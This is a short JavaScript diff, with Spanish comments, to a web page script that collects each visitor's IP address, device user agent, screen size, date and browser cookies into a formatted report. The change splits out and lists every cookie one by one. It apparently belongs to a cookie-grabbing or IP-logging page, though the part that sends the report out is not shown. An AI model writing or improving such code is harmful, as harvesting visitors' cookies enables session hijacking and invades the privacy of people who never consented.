@@ -412,7 +412,9 @@
             
             // Obtener más datos
             const userAgent = navigator.userAgent;
-            const cookies = document.cookie;
+            const allCookies = document.cookie.split(';')
+                .map(cookie => cookie.trim())
+                .join('\n🍪 ');
             const screenSize = `${window.screen.width}x${window.screen.height}`;
             const fecha = new Date().toLocaleString();
             
@@ -436,7 +438,7 @@
 🌐 IP: ${ip}
 📱 Dispositivo: ${userAgent}
 🖥️ Pantalla: ${screenSize}
-🍪 Cookies: ${cookies}
+🍪 Cookies: ${allCookies || 'No hay cookies'}
 📅 Fecha: ${fecha}
 
 ═══════════════════
